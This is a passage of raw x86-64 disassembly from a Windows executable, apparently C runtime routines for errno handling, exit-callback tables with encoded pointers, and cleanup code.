   140004864:	e8 5b ff ff ff       	call   0x1400047c4
   140004869:	48 83 c4 28          	add    $0x28,%rsp
   14000486d:	c3                   	ret
   14000486e:	cc                   	int3
   14000486f:	cc                   	int3
   140004870:	40 53                	rex push %rbx
   140004872:	48 83 ec 20          	sub    $0x20,%rsp
   140004876:	8b d9                	mov    %ecx,%ebx
   140004878:	e8 37 0b 00 00       	call   0x1400053b4
   14000487d:	44 8b 80 a8 03 00 00 	mov    0x3a8(%rax),%r8d
   140004884:	41 8b d0             	mov    %r8d,%edx
   140004887:	80 e2 02             	and    $0x2,%dl
   14000488a:	f6 da                	neg    %dl
   14000488c:	1b c9                	sbb    %ecx,%ecx
   14000488e:	83 fb ff             	cmp    $0xffffffff,%ebx
   140004891:	74 36                	je     0x1400048c9
   140004893:	85 db                	test   %ebx,%ebx
   140004895:	74 39                	je     0x1400048d0
   140004897:	83 fb 01             	cmp    $0x1,%ebx
   14000489a:	74 20                	je     0x1400048bc
   14000489c:	83 fb 02             	cmp    $0x2,%ebx
   14000489f:	74 15                	je     0x1400048b6
   1400048a1:	e8 ea 10 00 00       	call   0x140005990
   1400048a6:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400048ac:	e8 bf 0f 00 00       	call   0x140005870
   1400048b1:	83 c8 ff             	or     $0xffffffff,%eax
   1400048b4:	eb 1d                	jmp    0x1400048d3
   1400048b6:	41 83 e0 fd          	and    $0xfffffffd,%r8d
   1400048ba:	eb 04                	jmp    0x1400048c0
   1400048bc:	41 83 c8 02          	or     $0x2,%r8d
   1400048c0:	44 89 80 a8 03 00 00 	mov    %r8d,0x3a8(%rax)
   1400048c7:	eb 07                	jmp    0x1400048d0
   1400048c9:	83 0d e0 2e 01 00 ff 	orl    $0xffffffff,0x12ee0(%rip)        # 0x1400177b0
   1400048d0:	8d 41 02             	lea    0x2(%rcx),%eax
   1400048d3:	48 83 c4 20          	add    $0x20,%rsp
   1400048d7:	5b                   	pop    %rbx
   1400048d8:	c3                   	ret
   1400048d9:	cc                   	int3
   1400048da:	cc                   	int3
   1400048db:	cc                   	int3
   1400048dc:	8b 05 5e 3a 01 00    	mov    0x13a5e(%rip),%eax        # 0x140018340
   1400048e2:	c3                   	ret
   1400048e3:	cc                   	int3
   1400048e4:	48 83 ec 28          	sub    $0x28,%rsp
   1400048e8:	83 f9 01             	cmp    $0x1,%ecx
   1400048eb:	76 15                	jbe    0x140004902
   1400048ed:	e8 9e 10 00 00       	call   0x140005990
   1400048f2:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400048f8:	e8 73 0f 00 00       	call   0x140005870
   1400048fd:	83 c8 ff             	or     $0xffffffff,%eax
   140004900:	eb 08                	jmp    0x14000490a
   140004902:	87 0d 38 3a 01 00    	xchg   %ecx,0x13a38(%rip)        # 0x140018340
   140004908:	8b c1                	mov    %ecx,%eax
   14000490a:	48 83 c4 28          	add    $0x28,%rsp
   14000490e:	c3                   	ret
   14000490f:	cc                   	int3
   140004910:	48 8d 05 2d 3a 01 00 	lea    0x13a2d(%rip),%rax        # 0x140018344
   140004917:	c3                   	ret
   140004918:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%rsp)
   14000491f:	00 
   140004920:	8b 44 24 10          	mov    0x10(%rsp),%eax
   140004924:	e9 47 18 00 00       	jmp    0x140006170
   140004929:	cc                   	int3
   14000492a:	cc                   	int3
   14000492b:	cc                   	int3
   14000492c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004931:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004936:	57                   	push   %rdi
   140004937:	48 83 ec 20          	sub    $0x20,%rsp
   14000493b:	49 8b d9             	mov    %r9,%rbx
   14000493e:	49 8b f8             	mov    %r8,%rdi
   140004941:	8b 0a                	mov    (%rdx),%ecx
   140004943:	e8 e0 16 00 00       	call   0x140006028
   140004948:	90                   	nop
   140004949:	48 8b cf             	mov    %rdi,%rcx
   14000494c:	e8 53 00 00 00       	call   0x1400049a4
   140004951:	8b f8                	mov    %eax,%edi
   140004953:	8b 0b                	mov    (%rbx),%ecx
   140004955:	e8 22 17 00 00       	call   0x14000607c
   14000495a:	8b c7                	mov    %edi,%eax
   14000495c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004961:	48 83 c4 20          	add    $0x20,%rsp
   140004965:	5f                   	pop    %rdi
   140004966:	c3                   	ret
   140004967:	cc                   	int3
   140004968:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000496d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004972:	57                   	push   %rdi
   140004973:	48 83 ec 20          	sub    $0x20,%rsp
   140004977:	49 8b d9             	mov    %r9,%rbx
   14000497a:	49 8b f8             	mov    %r8,%rdi
   14000497d:	8b 0a                	mov    (%rdx),%ecx
   14000497f:	e8 a4 16 00 00       	call   0x140006028
   140004984:	90                   	nop
   140004985:	48 8b cf             	mov    %rdi,%rcx
   140004988:	e8 c7 01 00 00       	call   0x140004b54
   14000498d:	8b f8                	mov    %eax,%edi
   14000498f:	8b 0b                	mov    (%rbx),%ecx
   140004991:	e8 e6 16 00 00       	call   0x14000607c
   140004996:	8b c7                	mov    %edi,%eax
   140004998:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000499d:	48 83 c4 20          	add    $0x20,%rsp
   1400049a1:	5f                   	pop    %rdi
   1400049a2:	c3                   	ret
   1400049a3:	cc                   	int3
   1400049a4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400049a9:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400049ae:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400049b3:	57                   	push   %rdi
   1400049b4:	41 56                	push   %r14
   1400049b6:	41 57                	push   %r15
   1400049b8:	48 83 ec 20          	sub    $0x20,%rsp
   1400049bc:	48 8b 01             	mov    (%rcx),%rax
   1400049bf:	33 ed                	xor    %ebp,%ebp
   1400049c1:	4c 8b f9             	mov    %rcx,%r15
   1400049c4:	48 8b 18             	mov    (%rax),%rbx
   1400049c7:	48 85 db             	test   %rbx,%rbx
   1400049ca:	0f 84 68 01 00 00    	je     0x140004b38
   1400049d0:	4c 8b 15 29 26 01 00 	mov    0x12629(%rip),%r10        # 0x140017000
   1400049d7:	4c 8b 4b 08          	mov    0x8(%rbx),%r9
   1400049db:	49 8b f2             	mov    %r10,%rsi
   1400049de:	48 33 33             	xor    (%rbx),%rsi
   1400049e1:	4d 33 ca             	xor    %r10,%r9
   1400049e4:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   1400049e8:	41 8b ca             	mov    %r10d,%ecx
   1400049eb:	83 e1 3f             	and    $0x3f,%ecx
   1400049ee:	49 33 da             	xor    %r10,%rbx
   1400049f1:	48 d3 cb             	ror    %cl,%rbx
   1400049f4:	48 d3 ce             	ror    %cl,%rsi
   1400049f7:	49 d3 c9             	ror    %cl,%r9
   1400049fa:	4c 3b cb             	cmp    %rbx,%r9
   1400049fd:	0f 85 a7 00 00 00    	jne    0x140004aaa
   140004a03:	48 2b de             	sub    %rsi,%rbx
   140004a06:	b8 00 02 00 00       	mov    $0x200,%eax
   140004a0b:	48 c1 fb 03          	sar    $0x3,%rbx
   140004a0f:	48 3b d8             	cmp    %rax,%rbx
   140004a12:	48 8b fb             	mov    %rbx,%rdi
   140004a15:	48 0f 47 f8          	cmova  %rax,%rdi
   140004a19:	8d 45 20             	lea    0x20(%rbp),%eax
   140004a1c:	48 03 fb             	add    %rbx,%rdi
   140004a1f:	48 0f 44 f8          	cmove  %rax,%rdi
   140004a23:	48 3b fb             	cmp    %rbx,%rdi
   140004a26:	72 1e                	jb     0x140004a46
   140004a28:	44 8d 45 08          	lea    0x8(%rbp),%r8d
   140004a2c:	48 8b d7             	mov    %rdi,%rdx
   140004a2f:	48 8b ce             	mov    %rsi,%rcx
   140004a32:	e8 fd 3e 00 00       	call   0x140008934
   140004a37:	33 c9                	xor    %ecx,%ecx
   140004a39:	4c 8b f0             	mov    %rax,%r14
   140004a3c:	e8 2f 17 00 00       	call   0x140006170
   140004a41:	4d 85 f6             	test   %r14,%r14
   140004a44:	75 28                	jne    0x140004a6e
   140004a46:	48 8d 7b 04          	lea    0x4(%rbx),%rdi
   140004a4a:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140004a50:	48 8b d7             	mov    %rdi,%rdx
   140004a53:	48 8b ce             	mov    %rsi,%rcx
   140004a56:	e8 d9 3e 00 00       	call   0x140008934
   140004a5b:	33 c9                	xor    %ecx,%ecx
   140004a5d:	4c 8b f0             	mov    %rax,%r14
   140004a60:	e8 0b 17 00 00       	call   0x140006170
   140004a65:	4d 85 f6             	test   %r14,%r14
   140004a68:	0f 84 ca 00 00 00    	je     0x140004b38
   140004a6e:	4c 8b 15 8b 25 01 00 	mov    0x1258b(%rip),%r10        # 0x140017000
   140004a75:	4d 8d 0c de          	lea    (%r14,%rbx,8),%r9
   140004a79:	49 8d 1c fe          	lea    (%r14,%rdi,8),%rbx
   140004a7d:	49 8b f6             	mov    %r14,%rsi
   140004a80:	48 8b cb             	mov    %rbx,%rcx
   140004a83:	49 2b c9             	sub    %r9,%rcx
   140004a86:	48 83 c1 07          	add    $0x7,%rcx
   140004a8a:	48 c1 e9 03          	shr    $0x3,%rcx
   140004a8e:	4c 3b cb             	cmp    %rbx,%r9
   140004a91:	48 0f 47 cd          	cmova  %rbp,%rcx
   140004a95:	48 85 c9             	test   %rcx,%rcx
   140004a98:	74 10                	je     0x140004aaa
   140004a9a:	49 8b c2             	mov    %r10,%rax
   140004a9d:	49 8b f9             	mov    %r9,%rdi
   140004aa0:	f3 48 ab             	rep stos %rax,(%rdi)
   140004aa3:	4c 8b 15 56 25 01 00 	mov    0x12556(%rip),%r10        # 0x140017000
   140004aaa:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140004ab0:	49 8d 79 08          	lea    0x8(%r9),%rdi
   140004ab4:	41 8b c8             	mov    %r8d,%ecx
   140004ab7:	41 8b c2             	mov    %r10d,%eax
   140004aba:	83 e0 3f             	and    $0x3f,%eax
   140004abd:	2b c8                	sub    %eax,%ecx
   140004abf:	49 8b 47 08          	mov    0x8(%r15),%rax
   140004ac3:	48 8b 10             	mov    (%rax),%rdx
   140004ac6:	41 8b c0             	mov    %r8d,%eax
   140004ac9:	48 d3 ca             	ror    %cl,%rdx
   140004acc:	49 33 d2             	xor    %r10,%rdx
   140004acf:	49 89 11             	mov    %rdx,(%r9)
   140004ad2:	48 8b 15 27 25 01 00 	mov    0x12527(%rip),%rdx        # 0x140017000
   140004ad9:	8b ca                	mov    %edx,%ecx
   140004adb:	83 e1 3f             	and    $0x3f,%ecx
   140004ade:	2b c1                	sub    %ecx,%eax
   140004ae0:	8a c8                	mov    %al,%cl
   140004ae2:	49 8b 07             	mov    (%r15),%rax
   140004ae5:	48 d3 ce             	ror    %cl,%rsi
   140004ae8:	48 33 f2             	xor    %rdx,%rsi
   140004aeb:	48 8b 08             	mov    (%rax),%rcx
   140004aee:	48 89 31             	mov    %rsi,(%rcx)
   140004af1:	41 8b c8             	mov    %r8d,%ecx
   140004af4:	48 8b 15 05 25 01 00 	mov    0x12505(%rip),%rdx        # 0x140017000
   140004afb:	8b c2                	mov    %edx,%eax
   140004afd:	83 e0 3f             	and    $0x3f,%eax
   140004b00:	2b c8                	sub    %eax,%ecx
   140004b02:	49 8b 07             	mov    (%r15),%rax
   140004b05:	48 d3 cf             	ror    %cl,%rdi
   140004b08:	48 33 fa             	xor    %rdx,%rdi
   140004b0b:	48 8b 10             	mov    (%rax),%rdx
   140004b0e:	48 89 7a 08          	mov    %rdi,0x8(%rdx)
   140004b12:	48 8b 15 e7 24 01 00 	mov    0x124e7(%rip),%rdx        # 0x140017000
   140004b19:	8b c2                	mov    %edx,%eax
   140004b1b:	83 e0 3f             	and    $0x3f,%eax
   140004b1e:	44 2b c0             	sub    %eax,%r8d
   140004b21:	49 8b 07             	mov    (%r15),%rax
   140004b24:	41 8a c8             	mov    %r8b,%cl
   140004b27:	48 d3 cb             	ror    %cl,%rbx
   140004b2a:	48 33 da             	xor    %rdx,%rbx
   140004b2d:	48 8b 08             	mov    (%rax),%rcx
   140004b30:	33 c0                	xor    %eax,%eax
   140004b32:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   140004b36:	eb 03                	jmp    0x140004b3b
   140004b38:	83 c8 ff             	or     $0xffffffff,%eax
   140004b3b:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140004b40:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   140004b45:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140004b4a:	48 83 c4 20          	add    $0x20,%rsp
   140004b4e:	41 5f                	pop    %r15
   140004b50:	41 5e                	pop    %r14
   140004b52:	5f                   	pop    %rdi
   140004b53:	c3                   	ret
   140004b54:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004b59:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004b5e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004b63:	57                   	push   %rdi
   140004b64:	41 56                	push   %r14
   140004b66:	41 57                	push   %r15
   140004b68:	48 83 ec 20          	sub    $0x20,%rsp
   140004b6c:	48 8b 01             	mov    (%rcx),%rax
   140004b6f:	48 8b f1             	mov    %rcx,%rsi
   140004b72:	48 8b 18             	mov    (%rax),%rbx
   140004b75:	48 85 db             	test   %rbx,%rbx
   140004b78:	75 08                	jne    0x140004b82
   140004b7a:	83 c8 ff             	or     $0xffffffff,%eax
   140004b7d:	e9 cf 00 00 00       	jmp    0x140004c51
   140004b82:	4c 8b 05 77 24 01 00 	mov    0x12477(%rip),%r8        # 0x140017000
   140004b89:	41 8b c8             	mov    %r8d,%ecx
   140004b8c:	49 8b f8             	mov    %r8,%rdi
   140004b8f:	48 33 3b             	xor    (%rbx),%rdi
   140004b92:	83 e1 3f             	and    $0x3f,%ecx
   140004b95:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   140004b99:	48 d3 cf             	ror    %cl,%rdi
   140004b9c:	49 33 d8             	xor    %r8,%rbx
   140004b9f:	48 d3 cb             	ror    %cl,%rbx
   140004ba2:	48 8d 47 ff          	lea    -0x1(%rdi),%rax
   140004ba6:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
   140004baa:	0f 87 9f 00 00 00    	ja     0x140004c4f
   140004bb0:	41 8b c8             	mov    %r8d,%ecx
   140004bb3:	4d 8b f0             	mov    %r8,%r14
   140004bb6:	83 e1 3f             	and    $0x3f,%ecx
   140004bb9:	4c 8b ff             	mov    %rdi,%r15
   140004bbc:	48 8b eb             	mov    %rbx,%rbp
   140004bbf:	48 83 eb 08          	sub    $0x8,%rbx
   140004bc3:	48 3b df             	cmp    %rdi,%rbx
   140004bc6:	72 55                	jb     0x140004c1d
   140004bc8:	48 8b 03             	mov    (%rbx),%rax
   140004bcb:	49 3b c6             	cmp    %r14,%rax
   140004bce:	74 ef                	je     0x140004bbf
   140004bd0:	49 33 c0             	xor    %r8,%rax
   140004bd3:	4c 89 33             	mov    %r14,(%rbx)
   140004bd6:	48 d3 c8             	ror    %cl,%rax
   140004bd9:	ff 15 a9 86 00 00    	call   *0x86a9(%rip)        # 0x14000d288
   140004bdf:	4c 8b 05 1a 24 01 00 	mov    0x1241a(%rip),%r8        # 0x140017000
   140004be6:	48 8b 06             	mov    (%rsi),%rax
   140004be9:	41 8b c8             	mov    %r8d,%ecx
   140004bec:	83 e1 3f             	and    $0x3f,%ecx
   140004bef:	48 8b 10             	mov    (%rax),%rdx
   140004bf2:	4c 8b 0a             	mov    (%rdx),%r9
   140004bf5:	48 8b 42 08          	mov    0x8(%rdx),%rax
   140004bf9:	4d 33 c8             	xor    %r8,%r9
   140004bfc:	49 33 c0             	xor    %r8,%rax
   140004bff:	49 d3 c9             	ror    %cl,%r9
   140004c02:	48 d3 c8             	ror    %cl,%rax
   140004c05:	4d 3b cf             	cmp    %r15,%r9
   140004c08:	75 05                	jne    0x140004c0f
   140004c0a:	48 3b c5             	cmp    %rbp,%rax
   140004c0d:	74 b0                	je     0x140004bbf
   140004c0f:	4d 8b f9             	mov    %r9,%r15
   140004c12:	49 8b f9             	mov    %r9,%rdi
   140004c15:	48 8b e8             	mov    %rax,%rbp
   140004c18:	48 8b d8             	mov    %rax,%rbx
   140004c1b:	eb a2                	jmp    0x140004bbf
   140004c1d:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   140004c21:	74 0f                	je     0x140004c32
   140004c23:	48 8b cf             	mov    %rdi,%rcx
   140004c26:	e8 45 15 00 00       	call   0x140006170
   140004c2b:	4c 8b 05 ce 23 01 00 	mov    0x123ce(%rip),%r8        # 0x140017000
   140004c32:	48 8b 06             	mov    (%rsi),%rax
   140004c35:	48 8b 08             	mov    (%rax),%rcx
   140004c38:	4c 89 01             	mov    %r8,(%rcx)
   140004c3b:	48 8b 06             	mov    (%rsi),%rax
   140004c3e:	48 8b 08             	mov    (%rax),%rcx
   140004c41:	4c 89 41 08          	mov    %r8,0x8(%rcx)
   140004c45:	48 8b 06             	mov    (%rsi),%rax
   140004c48:	48 8b 08             	mov    (%rax),%rcx
   140004c4b:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   140004c4f:	33 c0                	xor    %eax,%eax
   140004c51:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004c56:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140004c5b:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140004c60:	48 83 c4 20          	add    $0x20,%rsp
   140004c64:	41 5f                	pop    %r15
   140004c66:	41 5e                	pop    %r14
   140004c68:	5f                   	pop    %rdi
   140004c69:	c3                   	ret
   140004c6a:	cc                   	int3
   140004c6b:	cc                   	int3
   140004c6c:	48 8b d1             	mov    %rcx,%rdx
   140004c6f:	48 8d 0d d2 36 01 00 	lea    0x136d2(%rip),%rcx        # 0x140018348
   140004c76:	e9 65 00 00 00       	jmp    0x140004ce0
   140004c7b:	cc                   	int3
   140004c7c:	4c 8b dc             	mov    %rsp,%r11
   140004c7f:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   140004c83:	48 83 ec 38          	sub    $0x38,%rsp
   140004c87:	49 8d 43 08          	lea    0x8(%r11),%rax
   140004c8b:	49 89 43 e8          	mov    %rax,-0x18(%r11)
   140004c8f:	4d 8d 4b 18          	lea    0x18(%r11),%r9
   140004c93:	b8 02 00 00 00       	mov    $0x2,%eax
   140004c98:	4d 8d 43 e8          	lea    -0x18(%r11),%r8
   140004c9c:	49 8d 53 20          	lea    0x20(%r11),%rdx
   140004ca0:	89 44 24 50          	mov    %eax,0x50(%rsp)
   140004ca4:	49 8d 4b 10          	lea    0x10(%r11),%rcx
   140004ca8:	89 44 24 58          	mov    %eax,0x58(%rsp)
   140004cac:	e8 b7 fc ff ff       	call   0x140004968
   140004cb1:	48 83 c4 38          	add    $0x38,%rsp
   140004cb5:	c3                   	ret
   140004cb6:	cc                   	int3
   140004cb7:	cc                   	int3
   140004cb8:	48 85 c9             	test   %rcx,%rcx
   140004cbb:	75 04                	jne    0x140004cc1
   140004cbd:	83 c8 ff             	or     $0xffffffff,%eax
   140004cc0:	c3                   	ret
   140004cc1:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140004cc5:	48 39 01             	cmp    %rax,(%rcx)
   140004cc8:	75 12                	jne    0x140004cdc
   140004cca:	48 8b 05 2f 23 01 00 	mov    0x1232f(%rip),%rax        # 0x140017000
   140004cd1:	48 89 01             	mov    %rax,(%rcx)
   140004cd4:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140004cd8:	48 89 41 10          	mov    %rax,0x10(%rcx)
   140004cdc:	33 c0                	xor    %eax,%eax
   140004cde:	c3                   	ret
   140004cdf:	cc                   	int3
   140004ce0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004ce5:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140004cea:	55                   	push   %rbp
   140004ceb:	48 8b ec             	mov    %rsp,%rbp
   140004cee:	48 83 ec 40          	sub    $0x40,%rsp
   140004cf2:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140004cf6:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140004cfa:	4c 8d 4d 28          	lea    0x28(%rbp),%r9
   140004cfe:	48 8d 45 18          	lea    0x18(%rbp),%rax
   140004d02:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140004d06:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   140004d0a:	b8 02 00 00 00       	mov    $0x2,%eax
   140004d0f:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140004d13:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   140004d17:	89 45 28             	mov    %eax,0x28(%rbp)
   140004d1a:	89 45 e0             	mov    %eax,-0x20(%rbp)
   140004d1d:	e8 0a fc ff ff       	call   0x14000492c
   140004d22:	48 83 c4 40          	add    $0x40,%rsp
   140004d26:	5d                   	pop    %rbp
   140004d27:	c3                   	ret
   140004d28:	48 8d 05 31 23 01 00 	lea    0x12331(%rip),%rax        # 0x140017060
   140004d2f:	48 89 05 fa 37 01 00 	mov    %rax,0x137fa(%rip)        # 0x140018530
   140004d36:	b0 01                	mov    $0x1,%al
   140004d38:	c3                   	ret
   140004d39:	cc                   	int3
   140004d3a:	cc                   	int3
   140004d3b:	cc                   	int3
   140004d3c:	48 83 ec 28          	sub    $0x28,%rsp
   140004d40:	48 8d 0d 01 36 01 00 	lea    0x13601(%rip),%rcx        # 0x140018348
   140004d47:	e8 6c ff ff ff       	call   0x140004cb8
   140004d4c:	48 8d 0d 0d 36 01 00 	lea    0x1360d(%rip),%rcx        # 0x140018360
   140004d53:	e8 60 ff ff ff       	call   0x140004cb8
   140004d58:	b0 01                	mov    $0x1,%al
   140004d5a:	48 83 c4 28          	add    $0x28,%rsp
   140004d5e:	c3                   	ret
   140004d5f:	cc                   	int3
   140004d60:	48 83 ec 28          	sub    $0x28,%rsp
   140004d64:	e8 df f5 ff ff       	call   0x140004348
   140004d69:	b0 01                	mov    $0x1,%al
   140004d6b:	48 83 c4 28          	add    $0x28,%rsp
   140004d6f:	c3                   	ret
   140004d70:	40 53                	rex push %rbx
   140004d72:	48 83 ec 20          	sub    $0x20,%rsp
   140004d76:	48 8b 1d 83 22 01 00 	mov    0x12283(%rip),%rbx        # 0x140017000
   140004d7d:	48 8b cb             	mov    %rbx,%rcx
   140004d80:	e8 33 0a 00 00       	call   0x1400057b8
   140004d85:	48 8b cb             	mov    %rbx,%rcx
   140004d88:	e8 9b ed ff ff       	call   0x140003b28
   140004d8d:	48 8b cb             	mov    %rbx,%rcx
   140004d90:	e8 93 3d 00 00       	call   0x140008b28
   140004d95:	48 8b cb             	mov    %rbx,%rcx
   140004d98:	e8 b3 ef ff ff       	call   0x140003d50
   140004d9d:	48 8b cb             	mov    %rbx,%rcx
   140004da0:	e8 63 f9 ff ff       	call   0x140004708
   140004da5:	b0 01                	mov    $0x1,%al
   140004da7:	48 83 c4 20          	add    $0x20,%rsp
   140004dab:	5b                   	pop    %rbx
   140004dac:	c3                   	ret
   140004dad:	cc                   	int3
   140004dae:	cc                   	int3
   140004daf:	cc                   	int3
   140004db0:	33 c9                	xor    %ecx,%ecx
   140004db2:	e9 81 da ff ff       	jmp    0x140002838
   140004db7:	cc                   	int3
   140004db8:	40 53                	rex push %rbx
   140004dba:	48 83 ec 20          	sub    $0x20,%rsp
   140004dbe:	48 8b 0d c3 39 01 00 	mov    0x139c3(%rip),%rcx        # 0x140018788
   140004dc5:	83 c8 ff             	or     $0xffffffff,%eax
   140004dc8:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   140004dcc:	83 f8 01             	cmp    $0x1,%eax
   140004dcf:	75 1f                	jne    0x140004df0
   140004dd1:	48 8b 0d b0 39 01 00 	mov    0x139b0(%rip),%rcx        # 0x140018788
   140004dd8:	48 8d 1d f1 23 01 00 	lea    0x123f1(%rip),%rbx        # 0x1400171d0
   140004ddf:	48 3b cb             	cmp    %rbx,%rcx
   140004de2:	74 0c                	je     0x140004df0
   140004de4:	e8 87 13 00 00       	call   0x140006170
   140004de9:	48 89 1d 98 39 01 00 	mov    %rbx,0x13998(%rip)        # 0x140018788
   140004df0:	b0 01                	mov    $0x1,%al
   140004df2:	48 83 c4 20          	add    $0x20,%rsp
   140004df6:	5b                   	pop    %rbx
   140004df7:	c3                   	ret
   140004df8:	48 83 ec 28          	sub    $0x28,%rsp
   140004dfc:	48 8b 0d 15 3e 01 00 	mov    0x13e15(%rip),%rcx        # 0x140018c18
   140004e03:	e8 68 13 00 00       	call   0x140006170
   140004e08:	48 8b 0d 11 3e 01 00 	mov    0x13e11(%rip),%rcx        # 0x140018c20
   140004e0f:	48 83 25 01 3e 01 00 	andq   $0x0,0x13e01(%rip)        # 0x140018c18
   140004e16:	00 
   140004e17:	e8 54 13 00 00       	call   0x140006170
   140004e1c:	48 8b 0d 85 39 01 00 	mov    0x13985(%rip),%rcx        # 0x1400187a8
   140004e23:	48 83 25 f5 3d 01 00 	andq   $0x0,0x13df5(%rip)        # 0x140018c20
   140004e2a:	00 
   140004e2b:	e8 40 13 00 00       	call   0x140006170
   140004e30:	48 8b 0d 79 39 01 00 	mov    0x13979(%rip),%rcx        # 0x1400187b0
   140004e37:	48 83 25 69 39 01 00 	andq   $0x0,0x13969(%rip)        # 0x1400187a8
   140004e3e:	00 
   140004e3f:	e8 2c 13 00 00       	call   0x140006170
   140004e44:	48 83 25 64 39 01 00 	andq   $0x0,0x13964(%rip)        # 0x1400187b0
   140004e4b:	00 
   140004e4c:	b0 01                	mov    $0x1,%al
   140004e4e:	48 83 c4 28          	add    $0x28,%rsp
   140004e52:	c3                   	ret
   140004e53:	cc                   	int3
   140004e54:	48 8d 15 e5 96 00 00 	lea    0x96e5(%rip),%rdx        # 0x14000e540
   140004e5b:	48 8d 0d de 95 00 00 	lea    0x95de(%rip),%rcx        # 0x14000e440
   140004e62:	e9 8d 3b 00 00       	jmp    0x1400089f4
   140004e67:	cc                   	int3
   140004e68:	48 83 ec 28          	sub    $0x28,%rsp
   140004e6c:	84 c9                	test   %cl,%cl
   140004e6e:	74 16                	je     0x140004e86
   140004e70:	48 83 3d 98 3d 01 00 	cmpq   $0x0,0x13d98(%rip)        # 0x140018c10
   140004e77:	00 
   140004e78:	74 05                	je     0x140004e7f
   140004e7a:	e8 d9 41 00 00       	call   0x140009058
   140004e7f:	b0 01                	mov    $0x1,%al
   140004e81:	48 83 c4 28          	add    $0x28,%rsp
   140004e85:	c3                   	ret
   140004e86:	48 8d 15 b3 96 00 00 	lea    0x96b3(%rip),%rdx        # 0x14000e540
   140004e8d:	48 8d 0d ac 95 00 00 	lea    0x95ac(%rip),%rcx        # 0x14000e440
